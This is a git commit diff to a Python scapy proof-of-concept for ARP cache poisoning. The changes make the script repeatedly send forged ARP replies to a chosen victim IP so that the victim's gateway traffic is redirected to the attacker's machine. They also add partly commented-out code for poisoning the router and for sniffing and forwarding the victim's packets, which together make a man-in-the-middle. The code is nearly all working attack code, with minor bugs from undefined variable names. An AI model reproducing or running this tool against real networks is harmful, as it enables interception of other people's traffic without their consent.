00dcdc35f9f840db14b42db38b77de8529e76686
Nir <nir@nirharel.space>
2018-06-09 14:40:53 +0300

    improved PoC to also tell the router to  send packets to us

--- ARP_PoC.py
+++ ARP_PoC.py
@@ -1,63 +1,83 @@
 from scapy3k.all import *
 import time
+import threading
+
+victim_details = []
+lan_details = {}
+
+def get_mac(ip: str) -> str:
+    """
+    Gets the mac for an IP address using ARP.
+    """
+    return sr1(ARP(op=ARP.who_has, psrc=lan_details["my_ip"], pdst=ip))[ARP].hwsrc
 
 
-def poison_arp(victim_ip: str, default_gateway_ip: str, host_mac_address: str) -> None:
+def poison_arp() -> None:
     """
     Makes an ARP attack with the specified parameters.
-    :param victim_ip: The PC to spoil
-    :param default_gateway_ip: IP of the dg provided by DHCP.
-    :param host_mac_address: mac address of the PC that will get the transmission.
     :return:
     """
-    packet = Ether() / ARP()
-    packet[Ether].dst = 'ff:ff:ff:ff:ff:ff'  # Broadcast to all PC on the LAN
-    packet[ARP].psrc = default_gateway_ip  # Like it came from the gateway
-    packet[ARP].op = 2  # Reply op type ("is-at")
-    packet[ARP].pdst = victim_ip  # Target the falsified ARP packet to the victim pc.
+    global lan_details
+    global victim_details
+    print(lan_details)
+    print(victim_details)
+    try:
+        while True:
+            victim_packet = ARP(
+                psrc=lan_details["gateway_ip"],  # Like it came from the gateway
+                op=2,  # is-at  op
+                pdst=victim_details[0], # Target the falsified ARP packet to the victim pc.
+                hwsrc=lan_details["my_mac"], # The victim PC needs to know which MAC to send to as the "default gateway"
+                hwdst=victim_details[1])  # Broadcast to all PCs on LAN
 
-    packet[ARP].hwsrc = host_mac_address  # The victim PC needs to know which MAC to send to as the "default gateway"
-    packet[ARP].hwdst = 'ff:ff:ff:ff:ff:ff'  # Broadcast to all PCs on LAN
-    packet.show()  # Print the packet just in-case
-    sendp(packet)  # Send w/o expecting a response
+            gateway_packet = ARP(
+                psrc=victim_details[0],  # as if it came from the victim pc
+                op=2,  # is-at operation
+                pdst=lan_details["gateway_ip"],  # the target is our default gateway
+                hwsrc=lan_details["my_mac"],  # the source is our mac since we want traffic directed to us.
+                hwdst=lan_details["gateway_mac"],)  # dst is just the default gateway
+
+            send(victim_packet, verbose=0)
+            #send(gateway_packet, verbose=0)  # Send w/o expecting a response
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("Finished bombing the victim {}".format(victim_ip))
 
 
 def send_spoofed(packet: Packet):
-    send(packet)
+    packet[Ether].dst = lan_details["gateway_mac"]
+
+    packet.show()
+    #input()
+    sendp(packet)
 
 
-def get_default_gateway() -> str:
-    p = srp1(Ether()/IP(dst="google.com", ttl=0) / ICMP() / "lorem", verbose=1)
-    return p[Ether].src  # This works because the first hop is our router.
+def get_local_details() -> dict:
+    p = srp1(Ether() / IP(dst="google.com", ttl=0) / ICMP() / "lorem", verbose=0)
+    data_dict = {"my_mac": p[Ether].dst, "gateway_mac": p[Ether].src, "my_ip": p[IP].dst, "gateway_ip": p[IP].src}
+    return data_dict
 
 
-def get_mac_address() -> str:
-    """Gets the host PCs mac address on the wanted interface."""
-    my_interfaces = get_if_list()
-    print("\n".join([f"{num}: {interf}" for num, interf in enumerate(my_interfaces)]))
-    interface = my_interfaces[int(input("Choose an interface:"))]
-
-    return get_if_hwaddr(interface)
+def is_victim(packet):
+    return IP in packet and packet[IP].src == victim_pc
 
 
 def main():
-    default_gateway = get_default_gateway()
-    print(default_gateway)
-    try:
-        my_mac_address = get_mac_address()
+    global lan_details
+    lan_details = get_local_details()
 
-    except Exception as mac_e:
-        my_mac_address = input("Auto-detection failed.\n"
-                               "Please use the format aa:bb:cc:dd:ee:ff.\nYour MAC: ")
-        print("Error: " + mac_e)
-
-    victim_pc = input("Victim PC IP: ")
+    victim_details.append(input("Victim PC IP: "))
+    victim_details.append(get_mac(victim_details[0]))
 
     print("Bombing victim PC with ARP replies..")
+    poison_loop_thread = threading.Thread(target=poison_arp)
+    poison_loop_thread.start()
+
     try:
         while True:
-            poison_arp(victim_pc, default_gateway, my_mac_address)
-            time.sleep(2)
+            #sniff(lfilter=is_victim, prn=send_spoofed)
+            pass
+
     except KeyboardInterrupt:
         print("Stopped bombing")
 
